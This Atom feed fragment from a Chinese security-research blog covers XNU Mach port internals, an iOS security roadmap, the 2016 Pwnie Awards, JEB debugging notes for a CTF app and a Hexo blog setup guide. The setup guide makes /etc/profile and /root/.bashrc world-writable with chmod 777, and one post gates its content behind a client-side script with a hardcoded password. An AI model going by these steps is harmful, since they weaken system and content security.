 *typesCnt = actual;</div><div class="line">    <span class="keyword">return</span> KERN_SUCCESS;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 生成 gen</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IE_BITS_GEN_MASK    0xff000000  <span class="comment">/* 8 bits for generation */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IE_BITS_GEN(bits)   ((bits) &amp; IE_BITS_GEN_MASK)</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">mach_port_names_helper</span><span class="params">(</span></div><div class="line">    <span class="keyword">ipc_port_timestamp_t</span>    timestamp,</div><div class="line">    <span class="keyword">ipc_entry_t</span>     entry,</div><div class="line">    <span class="keyword">mach_port_name_t</span>    name,</div><div class="line">    <span class="keyword">mach_port_name_t</span>    *names,</div><div class="line">    <span class="keyword">mach_port_type_t</span>    *types,</div><div class="line">    <span class="keyword">ipc_entry_num_t</span>     *actualp)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">ipc_entry_bits_t</span> bits;</div><div class="line">    <span class="keyword">ipc_port_request_index_t</span> request;</div><div class="line">    <span class="keyword">mach_port_type_t</span> type = <span class="number">0</span>;</div><div class="line">    <span class="keyword">ipc_entry_num_t</span> actual;</div><div class="line">    <span class="keyword">ipc_port_t</span> port;</div><div class="line"></div><div class="line">    bits = entry-&gt;ie_bits;</div><div class="line">    request = entry-&gt;ie_request;</div><div class="line">    __IGNORE_WCASTALIGN(port = (<span class="keyword">ipc_port_t</span>) entry-&gt;ie_object);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (bits &amp; MACH_PORT_TYPE_RECEIVE) &#123;</div><div class="line">        assert(IP_VALID(port));</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (request != IE_REQ_NONE) &#123;</div><div class="line">   ...</div><div class="line">            type |= ipc_port_request_type(port, name, request);</div><div class="line">..</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bits &amp; MACH_PORT_TYPE_SEND_RIGHTS) &#123;</div><div class="line">        ...</div><div class="line">        reqtype = (request != IE_REQ_NONE) ?</div><div class="line">              ipc_port_request_type(port, name, request) : <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (ip_active(port) || IP_TIMESTAMP_ORDER(timestamp, port-&gt;ip_timestamp)) &#123;</div><div class="line">            type |= reqtype;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            bits &amp;= ~(IE_BITS_TYPE_MASK);</div><div class="line">            bits |= MACH_PORT_TYPE_DEAD_NAME;</div><div class="line">            <span class="comment">/* account for additional reference for dead-name notification */</span></div><div class="line">            <span class="keyword">if</span> (reqtype != <span class="number">0</span>)</div><div class="line">                bits++;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    type |= IE_BITS_TYPE(bits);</div><div class="line"></div><div class="line">    actual = *actualp;</div><div class="line">    names[actual] = name;</div><div class="line">    types[actual] = type;</div><div class="line">    *actualp = actual+<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">mach_port_type_t</span></div><div class="line">ipc_port_request_type(</div><div class="line">    <span class="keyword">ipc_port_t</span>          port,</div><div class="line">    __assert_only <span class="keyword">mach_port_name_t</span>  name,</div><div class="line">    <span class="keyword">ipc_port_request_index_t</span>    index)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">ipc_port_request_t</span> ipr, table;</div><div class="line">    <span class="keyword">mach_port_type_t</span> type = <span class="number">0</span>;</div><div class="line"></div><div class="line">    table = port-&gt;ip_requests;</div><div class="line">    assert (table != IPR_NULL);</div><div class="line"></div><div class="line">    assert(index != IE_REQ_NONE);</div><div class="line">    ipr = &amp;table[index];</div><div class="line">    assert(ipr-&gt;ipr_name == name);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (IP_VALID(IPR_SOR_PORT(ipr-&gt;ipr_soright))) &#123;</div><div class="line">        type |= MACH_PORT_TYPE_DNREQUEST;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (IPR_SOR_SPREQ(ipr-&gt;ipr_soright)) &#123;</div><div class="line">            type |= MACH_PORT_TYPE_SPREQUEST;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (!IPR_SOR_SPARMED(ipr-&gt;ipr_soright)) &#123;</div><div class="line">                type |= MACH_PORT_TYPE_SPREQUEST_DELAYED;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> type;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="搞清楚-mach-port-names-原理"><a href="#搞清楚-mach-port-names-原理" class="headerlink" title="搞清楚 mach_port_names 原理"></a>搞清楚 mach_port_names 原理</h3><p>原理就是 通过获取 目标进程的 task_t 对象， 然后获取 ipc_space 对象，从 ipc_space 的 is_table 遍历所有 entry, 根据 ie_bits 找到已经分配的 entry.</p>
<p>计算 port name ==&gt; <code>name = MACH_PORT_MAKE(index, IE_BITS_GEN(bits));</code><br>获取 type的逻辑 需要注意：</p>
<ol>
<li>获取 ipc_prot 对象（port）， entry-&gt;ie_object</li>
<li>获取请求的数组索引，entry-&gt;ie_request</li>
<li>获取请求数组 ，port-&gt;ip_requests</li>
<li>根据 ipr-&gt;ipr_soright 赋予 type 值</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;在《深入解析MAC OS X &amp;amp; iOS 操作系统》书上，代码清单10-1 中有一个例子 “Mach 端口导出器”， 分析代码流程搞清楚 MIG 的作用。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="了解" scheme="http://yoursite.com/tags/%E4%BA%86%E8%A7%A3/"/>
    
      <category term="ios" scheme="http://yoursite.com/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>iOS RoadMap</title>
    <link href="http://yoursite.com/2017/02/08/iOS-roadMap/"/>
    <id>http://yoursite.com/2017/02/08/iOS-roadMap/</id>
    <published>2017-02-08T05:58:07.000Z</published>
    <updated>2017-03-09T16:42:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>学习iOS安全的技术路线，分为：开发，工具，iOS安全模块，漏洞利用， 漏洞挖掘 5个模块。<br>(模块会发生变动)</p>
<a id="more"></a>
<p><img src="/include/img/iOS.jpg" alt="sdf"></p>
<h3 id="开发篇"><a href="#开发篇" class="headerlink" title="开发篇"></a>开发篇</h3><ol>
<li>语言 （swift, <a href="http://zh-google-styleguide.readthedocs.io/en/latest/google-objc-styleguide/contents/" target="_blank" rel="external">object-C</a>）</li>
<li>tweak</li>
<li>系统调用，开发模块(ioKit，消息响应等)</li>
</ol>
<h3 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h3><ol>
<li>砸壳工具</li>
<li>静态分析工具</li>
<li>动态调试工具</li>
<li>其他工具</li>
<li>脚本</li>
</ol>
<h3 id="iOS安全摸块"><a href="#iOS安全摸块" class="headerlink" title="iOS安全摸块"></a>iOS安全摸块</h3><ol>
<li>APP格式/组成</li>
<li>静态分析方法 (Arm64)</li>
<li><a href="http://bbs.iosre.com/t/debugserver-lldb-gdb/65" target="_blank" rel="external">动态调试方法</a><ol>
<li>应用调试</li>
<li>框架调试</li>
<li>内核调试</li>
</ol>
</li>
<li>重打包</li>
<li>砸壳原理</li>
</ol>
<h3 id="系统漏洞模块"><a href="#系统漏洞模块" class="headerlink" title="系统漏洞模块"></a>系统漏洞模块</h3><ol>
<li>提权</li>
<li>远程</li>
<li>越狱</li>
</ol>
<p>2017年春节后，蒸米在其 github 中发布一篇2016 iOS漏洞总结的文章，里面介绍的都是2016年的精华漏洞。<br><a href="/include/txt/2016年iOS公开可利用漏洞总结_CN.docx">2016年iOS公开可利用漏洞总结_CN</a></p>
<p>Apple 漏洞奖励计划</p>
<table>
<thead>
<tr>
<th>赏金类型</th>
<th>奖励金额</th>
</tr>
</thead>
<tbody>
<tr>
<td>安全启动固件组件</td>
<td>最高$200000</td>
</tr>
<tr>
<td>保护机密材料提取的安全协议处理器</td>
<td>最高$100000</td>
</tr>
<tr>
<td>执行任意代码内核权限</td>
<td>最高$50000</td>
</tr>
<tr>
<td>在苹果服务器上未经授权擅自访问iCloud帐户数据</td>
<td>最高$50000</td>
</tr>
<tr>
<td>在沙箱外对沙箱内的用户数据进行访问</td>
<td>最高$25000</td>
</tr>
</tbody>
</table>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h3 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h3><p><a href="http://resources.infosecinstitute.com/ios-application-security-part-1-setting-up-a-mobile-pentesting-platform/" target="_blank" rel="external">英文</a><br><a href="http://security.ios-wiki.com/" target="_blank" rel="external">iOS Security 中文</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;学习iOS安全的技术路线，分为：开发，工具，iOS安全模块，漏洞利用， 漏洞挖掘 5个模块。&lt;br&gt;(模块会发生变动)&lt;/p&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="ios" scheme="http://yoursite.com/tags/ios/"/>
    
      <category term="熟悉" scheme="http://yoursite.com/tags/%E7%86%9F%E6%82%89/"/>
    
  </entry>
  
  <entry>
    <title>2016 Pwnie Awards</title>
    <link href="http://yoursite.com/2017/02/08/2016-Pwnie-Awards/"/>
    <id>http://yoursite.com/2017/02/08/2016-Pwnie-Awards/</id>
    <published>2017-02-08T05:01:24.000Z</published>
    <updated>2017-03-09T16:42:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>2016 Black Hat重点记录</p>
<h3 id="精品漏洞"><a href="#精品漏洞" class="headerlink" title="精品漏洞"></a>精品漏洞</h3><a id="more"></a>
<p>Pwnie Awards 2016获奖名单揭晓</p>
<p>素有网络安全奥斯卡之称的Pwnie Awards正式公布各个奖项的归属。有关这个奖的分量就不必再多说了，我们直接来看获奖名单。</p>
<p><strong>最佳服务器BUG奖</strong>（Pwnie for Best Server-Side Bug）：Cisco ASA IKEv1/IKEv2 Fragmentation Heap Buffer Overflow缓冲溢出（CVE-2016-1287）。传说中最有趣、技术上精制复杂的服务器端漏洞利用。</p>
<p><strong>最佳客户端BUG奖</strong>（Pwnie for Best Client-Side Bug）：glibc getsddrinfo堆栈缓冲溢出（CVE-2015-7547）。</p>
<p><strong>最佳提权BUG奖</strong>（Pwnie for Best Privilege Escalation Bug）：Widevine QSEE TrustZone Privilege Escalation（CVE-2015-6639），就是前一阵影响Android系统高通芯片TrustZone的漏洞。</p>
<p><strong>最佳加密攻击奖</strong>（Pwnie for Best Crytographic Attack）：SSLv2 Crypto攻击（DROWN Attack）（CVE-2016-0800）。这个奖项是今年首度出现的，授予那些采用新奇的方式来打破加密系统的安全研究人员。</p>
<p><strong>最炫Hack奖</strong>（Pwnie for Best Junk or Stunt Hack）：远程劫持高速公路上的Jeep——去年比较火热针对切诺基的远程攻击。这个奖的英文原名其实很有趣，各位可以体会以下，有关这个奖的描述是这样的：“授予研究人员，及他们的公关团队，还有参与其中的记者，为其产生的超高公众影响力，甚至可能致许多不懂技术的朋友和家人会惊慌失措打来电话的技术。”</p>
<p><strong>最佳品牌奖</strong>（Pwnie for Best Branding）：Mousejack无线键盘注入BUG。这个奖授予话最大努力解释和宣传其发现的安全漏洞的企业。</p>
<p><strong>史诗成就奖</strong>（Pwnie for Epic Achievement）：Tavis Ormandy（针对他去年侵入绝大部分反病毒程度而颁发）。又一个全新的奖项，听着都感觉很高端，这个奖专门颁给那些获得前所未有的“成绩”（notoriery）的研究人员。</p>
<p><strong>最佳创新研究奖</strong>（Pwnie for Most Innovative Research）： Dedup Est Machina：Memory Deduplication as an Advanced Exploitation Vector（将内存重复数据删除作为高级利用向量，这是篇论文）。这个奖是颁给那些公布最有趣研究，即便研究还没实现的研究人员。</p>
<p><strong>最过分夸大BUG奖</strong>（Pwnie for Most Over-hyped Bug）：Badlock（CVE-2016-0128）。这个奖颁给被媒体过分关注，但实际上根本就没那么危险的安全漏洞。</p>
<p>最佳歌曲奖（Pwnie for Best Song）：Cyber-lair，来自Katie Moussouris。</p>
<p><strong>史诗级0wnage奖</strong>（Pwnie for Epic 0wnage）：Juniper Backdoor后门。此奖授予对企业或产品产生极大危害的研究人员或安全漏洞。</p>
<p><strong>终身成就奖</strong>：Mudge，Peiter C.Zatko。长期以来从事漏洞研究的教育专家、在安全行业有较大影响力，先前曾领导DARPA网络安全项目。</p>
<h3 id="Apple-漏洞奖励计划"><a href="#Apple-漏洞奖励计划" class="headerlink" title="Apple 漏洞奖励计划"></a>Apple 漏洞奖励计划</h3><table>
<thead>
<tr>
<th>赏金类型</th>
<th>奖励金额</th>
</tr>
</thead>
<tbody>
<tr>
<td>安全启动固件组件</td>
<td>最高$200000</td>
</tr>
<tr>
<td>保护机密材料提取的安全协议处理器</td>
<td>最高$100000</td>
</tr>
<tr>
<td>执行任意代码内核权限</td>
<td>最高$50000</td>
</tr>
<tr>
<td>在苹果服务器上未经授权擅自访问iCloud帐户数据</td>
<td>最高$50000</td>
</tr>
<tr>
<td>在沙箱外对沙箱内的用户数据进行访问</td>
<td>最高$25000</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;2016 Black Hat重点记录&lt;/p&gt;
&lt;h3 id=&quot;精品漏洞&quot;&gt;&lt;a href=&quot;#精品漏洞&quot; class=&quot;headerlink&quot; title=&quot;精品漏洞&quot;&gt;&lt;/a&gt;精品漏洞&lt;/h3&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/categories-exploit/"/>
    
    
      <category term="blackhat-2016" scheme="http://yoursite.com/tags/blackhat-2016/"/>
    
  </entry>
  
  <entry>
    <title>happy new year</title>
    <link href="http://yoursite.com/2017/02/04/happy-new-year/"/>
    <id>http://yoursite.com/2017/02/04/happy-new-year/</id>
    <published>2017-02-03T17:32:43.000Z</published>
    <updated>2017-03-09T16:04:46.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="生活" scheme="http://yoursite.com/categories/categories-life/"/>
    
    
  </entry>
  
  <entry>
    <title>jeb-v2.2.7真机调试 APK(nodebug)</title>
    <link href="http://yoursite.com/2017/01/24/jeb-v2-2-7%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95-APK-nodebug/"/>
    <id>http://yoursite.com/2017/01/24/jeb-v2-2-7真机调试-APK-nodebug/</id>
    <published>2017-01-23T16:31:49.000Z</published>
    <updated>2017-03-09T16:28:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>记录 在动态调试 app 中 gif库解析漏洞是使用的工具 和 遇到的一些坑， 分析漏洞只是顺带一提不作为重点。</p>
<a id="more"></a>
<h2 id="JEB2-2-7-调试阿里2016移动安全-第三题-app部分"><a href="#JEB2-2-7-调试阿里2016移动安全-第三题-app部分" class="headerlink" title="JEB2.2.7 调试阿里2016移动安全 第三题-app部分"></a>JEB2.2.7 调试阿里2016移动安全 第三题-app部分</h2><blockquote>
<p>说明：</p>
<pre><code>1. app debugable 开关关闭。我采用刷ROM(userdebug 版本)的方式绕过。
2. 测试手机: Nexus 5x
3. Android 版本: 6.0.1
</code></pre></blockquote>
<script>
    if( prompt("Please input password") !== String(111) )
    {
        alert('密码错误！');
        self.location='https://floatingguy.github.io/about/';
        // history.back();
    } else {
        alert("密码正确");
    }
</script>

<hr>
<p>工具：jeb-v2.2.7<br>需要配置的环境变量：JEB_HOME 和 ANDROID_SDK。</p>
<h3 id="bug-统计"><a href="#bug-统计" class="headerlink" title="bug 统计"></a>bug 统计</h3><ol>
<li>jeb动态调试BUG:<br> ANDROID_SDK配置完全正确，但是每次 debug 时都显示<code>找不到 ADB</code>。</li>
</ol>
<p>原因：我是通过Alfred 通过开启的 jeb.app， 这种方式访问不到环境变量所以找不到 ADB。<br>解决：</p>
<pre><code>1. 可以通过写脚本，每次在终端执行  （完成 jeb_debug...sh）
2. 到 jeb目录下执行 jeb_mac.sh
</code></pre><h3 id="jeb注意事项："><a href="#jeb注意事项：" class="headerlink" title="jeb注意事项："></a>jeb注意事项：</h3><pre><code>1. 只有在 bytecode view时才可以 debug
2. 视频中可以从 art 指令直接跳转到 so汇编中执行，但是我本次测试时不行。。。
3. localval 窗口显示的只有 数字没有字符不知道怎么对应。
</code></pre><h3 id="jeb-快捷键："><a href="#jeb-快捷键：" class="headerlink" title="jeb 快捷键："></a>jeb 快捷键：</h3><pre><code>* 下断点：cmd+B
* 反编译：q
* 后退/前进： alt+ ←/→
</code></pre><h2 id="题目注意事项"><a href="#题目注意事项" class="headerlink" title="题目注意事项"></a>题目注意事项</h2><p>在上传 gif 解析时，app中将 URL 强制从<code>URLConnection</code>转换成了 <code>HTTPURLConnection</code>类型，所以我们json文件中的<code>address</code>值必须包含<code>http://</code>否则会抛出<code>MalformedURLException</code>异常</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.pnfsoftware.com/blog/jeb-android-debuggers/" target="_blank" rel="external">AN INTRODUCTION TO JEB ANDROID DEBUGGERS</a><br><a href="https://www.pnfsoftware.com/blog/category/jeb2/" target="_blank" rel="external">ADVANCED DEBUGGER USAGE VIA THE INTERPRETER</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;记录 在动态调试 app 中 gif库解析漏洞是使用的工具 和 遇到的一些坑， 分析漏洞只是顺带一提不作为重点。&lt;/p&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
      <category term="jeb" scheme="http://yoursite.com/tags/jeb/"/>
    
      <category term="动态调试" scheme="http://yoursite.com/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    
      <category term="Armv8-64" scheme="http://yoursite.com/tags/Armv8-64/"/>
    
  </entry>
  
  <entry>
    <title>配置hexo + github page 个人Blog</title>
    <link href="http://yoursite.com/2017/01/22/%E9%85%8D%E7%BD%AEhexo-github-page-%E4%B8%AA%E4%BA%BABlog/"/>
    <id>http://yoursite.com/2017/01/22/配置hexo-github-page-个人Blog/</id>
    <published>2017-01-22T04:52:26.000Z</published>
    <updated>2017-03-09T16:42:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<h2 id="基础配置（一）"><a href="#基础配置（一）" class="headerlink" title="基础配置（一）"></a>基础配置（一）</h2><h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><a id="more"></a>
<p>1.install nodejs-v6.9.4</p>
<pre><code>下载zip package
</code></pre><ol>
<li>安装Nodejs<br> ubuntu: <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install nodejs</div><div class="line"><span class="comment">#检查版本</span></div><div class="line">node -v</div></pre></td></tr></table></figure>
</li>
</ol>
<p>如果nodejs 版本不是 <strong>v6.9.4</strong>,那么需要去官网下载按照包：</p>
<p>安装release版 <a href="http://www.ctolib.com/topics-106467.html" target="_blank" rel="external">Nodejs</a></p>
<blockquote>
<p>如果命令行下载不了 nodejs:<br>安装过程 官网下载好，解压。终端 mv node-v6.9.4-linux-x64 /opt/ 输入命令：sudo chmod 777 /etc/profile，进入目录下，备份一下，这里我是用 sublime text 打<br>开的，在末尾添加以下三行：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> NODE_HOME=/opt/node-v6.9.4-linux-x64</div><div class="line"><span class="built_in">export</span> PATH=PATH:PATH:NODE_HOME/bin</div><div class="line"><span class="built_in">export</span> NODE_PATH=<span class="variable">$NODE_HOME</span>/lib/node_modules</div></pre></td></tr></table></figure>
<blockquote>
<p>之后按保存退出 在命令行输入：source /etc/profile，然后在命令行输入：node -v，返回版本信息v6.9.4，说明环境变量配置就生效了；但，你会发现进入root账户，改配置并没有生效 在命令行输入：sudo chmod 777 /root/.bashrc,进入所在目录，备份好文件，并在文件末尾加入一行source /etc/profile命令，保存。这样就大功告成了。 操作完后记得将权限改回去。</p>
</blockquote>
<p>3.install nodejs-legacy</p>
<pre><code>sudo apt-get install nodejs-legacy
</code></pre><p>4.install hexo</p>
<pre><code>sudo npm install -g hexo-cli --registry=https://registry.npm.taobao.org
</code></pre><h3 id="配置Hexo"><a href="#配置Hexo" class="headerlink" title="配置Hexo"></a>配置Hexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir <span class="variable">$Blog</span>-name &amp;&amp; <span class="built_in">cd</span> <span class="variable">$Blog</span>-name</div><div class="line">hexo init <span class="variable">$blog</span></div><div class="line"><span class="built_in">cd</span> <span class="variable">$blog</span></div></pre></td></tr></table></figure>
<h3 id="Hexo-用法"><a href="#Hexo-用法" class="headerlink" title="Hexo 用法"></a>Hexo 用法</h3><ol>
<li><p>常用命令列表：</p>
<ol>
<li><strong>~ generate <g>        #生成静态文件</g></strong></li>
<li><strong>~ server <s>          #本地预览环境</s></strong></li>
<li><strong>~ new “paper name”    #创建博文</strong></li>
<li><strong>~ deploy <d>          #部署</d></strong></li>
<li>~ new page “page name”  #创建页面<br>本地测试在浏览器中打开 localhost:4000</li>
</ol>
</li>
<li><p>Hexo根目录结构</p>
</li>
</ol>
<ul>
<li><p>需要上传到 source repo 的文件</p>
<p>  #全局配置文件，站点基本信息(title/subtitle/author/..), 主题 …<br>  -rw-rw-r–  1 floatg floatg 1.5K  1月 21 16:51 _config.yml</p>
<p>  #所有博文都在source/目录下<br>  drwxrwxr-x  3 floatg floatg 4.0K  1月 21 16:51 source<br>  drwxrwxr-x  2 floatg floatg 4.0K  1月 21 16:51 scaffolds<br>  -rw-rw-r–  1 floatg floatg  448  1月 21 17:07 package.json</p>
<p>  #所有可以使用的主题都在这个目录下，每个主题对应一个文件夹<br>  drwxrwxr-x  4 floatg floatg 4.0K  1月 21 17:17 themes<br>  -rw-r–r–  1 floatg floatg  77B  1 23 15:39 .gitignore</p>
</li>
<li><p>.gitignore 过滤的文件</p>
<p>  -rw-rw-r–  1 floatg floatg  24K  1月 21 17:07 db.json<br>  drwxrwxr-x 12 floatg floatg 4.0K  1月 21 16:53 node_modules<br>  drwxrwxr-x  7 floatg floatg 4.0K  1月 21 17:07 public<br>  drwxr-xr-x   17 floatg  floatg   578B  1 23 15:16 .deploy_git</p>
</li>
</ul>
<p>#本地测试脚本<br>    -rwxr-xr-x    1 floatg  floatg    91B  1 23 14:38 rtest.sh<br>    -rw-r–r–@   1 floatg  floatg   6.0K  1 23 14:55 .DS_Store</p>
<h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>目前 我找到的主题比较少，只有默认的landscape 和huno，较喜欢huno。</p>
<ol>
<li><p>下载主题</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> themes</div><div class="line">git <span class="built_in">clone</span> git@github.com:someus/huno.git</div></pre></td></tr></table></figure>
</li>
<li><p>分析主题</p>
<ol>
<li>cyanstyle 可以设置背景图片,并且page主体是一个半透明的theme, 建议背景图片搞一个深色的图</li>
<li>huno  左右布局，极简风格，category,目录等基本功能齐全</li>
<li>landscape 上下布局</li>
<li>icarus  感觉是设计，艺术风，推荐给@Alian。 这个主体还有一些<a href="https://github.com/ppoffice/hexo-theme-icarus/issues" target="_blank" rel="external">bug</a>,测试的时候存在显示<a href="https://github.com/ppoffice/hexo-theme-icarus/wiki" target="_blank" rel="external">问题</a></li>
<li>aero-dual  上下布局，喜欢配色</li>
<li>yelee    很喜欢， 冬天显示列表+目录</li>
<li>xnew      目录+归档–按日期排列</li>
<li>GhoSadillaX  使用中</li>
</ol>
</li>
</ol>
<h2 id="更多功能"><a href="#更多功能" class="headerlink" title="更多功能"></a>更多功能</h2><p>(更多内容)[<a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" rel="external">http://ibruce.info/2013/11/22/hexo-your-blog/</a>]<br>(统计)[<a href="http://busuanzi.ibruce.info/" target="_blank" rel="external">http://busuanzi.ibruce.info/</a>]</p>
<p>hexo config review<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">hexo</span>: 3<span class="selector-class">.2</span><span class="selector-class">.2</span></div><div class="line"><span class="selector-tag">hexo-cli</span>: 1<span class="selector-class">.0</span><span class="selector-class">.2</span></div><div class="line"><span class="selector-tag">os</span>: <span class="selector-tag">Linux</span> 4<span class="selector-class">.x</span><span class="selector-class">.x-xx-generic</span> <span class="selector-tag">linux</span> <span class="selector-tag">xxx</span></div><div class="line"><span class="selector-tag">http_parser</span>: 1<span class="selector-class">.0</span></div><div class="line"><span class="selector-tag">node</span>: 0<span class="selector-class">.10</span><span class="selector-class">.25</span></div><div class="line"><span class="selector-tag">v8</span>: 3<span class="selector-class">.xx</span><span class="selector-class">.5</span><span class="selector-class">.9</span></div><div class="line"><span class="selector-tag">ares</span>: 1<span class="selector-class">.10</span><span class="selector-class">.0</span></div><div class="line"><span class="selector-tag">uv</span>: 0<span class="selector-class">.10</span><span class="selector-class">.23</span></div><div class="line"><span class="selector-tag">zlib</span>: 1<span class="selector-class">.2</span><span class="selector-class">.8</span></div><div class="line"><span class="selector-tag">modules</span>: 11</div><div class="line"><span class="selector-tag">openssl</span>: <span class="selector-tag">x</span><span class="selector-class">.x</span><span class="selector-class">.xf</span></div></pre></td></tr></table></figure></p>
<h2 id="夸主机同步-Blog"><a href="#夸主机同步-Blog" class="headerlink" title="夸主机同步 Blog"></a>夸主机同步 Blog</h2><h3 id="CI辅助自动部署"><a href="#CI辅助自动部署" class="headerlink" title="CI辅助自动部署"></a>CI辅助自动部署</h3><p>参考文章:<br><a href="http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/" target="_blank" rel="external">http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/</a><br><a href="https://formulahendry.github.io/2016/12/04/hexo-ci/" target="_blank" rel="external">https://formulahendry.github.io/2016/12/04/hexo-ci/</a></p>
<p>我首先尝试了使用appveyor 做CI的办法，效果不尽如人意。主要的问题在：</p>
<pre><code>1. nodejs, hexo的版本和我本地不同，导致命令 解析都不一样。解决办法：可以在yml中下载制定版本
2. 使用作者的yml, 直接把我content repo下的内容删除了连site都打不开了。
3. 执行速度很慢，push完成以后貌似要到[appveyor管理页面](https://ci.appveyor.com/project/FloatingGuy/floatingguy-github-io)去点击 **new build** 才能执行下去。
</code></pre><p>虽然有一些bug，不过还是蛮有趣的产品。先说下原理，再说下大概的步骤：</p>
<ol>
<li><p>原理：CI工具(这里是appveyor)会监控代码管理(github)中指定repo的commit记录, 发现有新的commit 就会将代码拉取到CI主机上，然后去执行repo根目录下的appveyor.yml中的命令。</p>
</li>
<li><p>步骤:</p>
<ol>
<li>open appveyor <a href="https://ci.appveyor.com/projects" target="_blank" rel="external">projects page</a></li>
<li>create new projects, choose Github, source-code repo (支持的所有代码管理工具)</li>
<li>add appveyor.yml to source-code repo root directory</li>
<li>get Token from <a href="https://help.github.com/articles/creating-an-access-token-for-command-line-use/" target="_blank" rel="external">Github</a></li>
<li>CI platform to <a href="https://ci.appveyor.com/tools/encrypt" target="_blank" rel="external">encrypt Token page</a></li>
<li>set CI environment<ul>
<li>STATIC_SITE_REPO    – github content repo</li>
<li>TARGET_BRANCH       – content repo branch</li>
<li>GIT_USER_EMAIL      – github account</li>
<li>GIT_USER_NAME       – github username</li>
</ul>
</li>
<li>oK,  you can using your blog， finally push source repo</li>
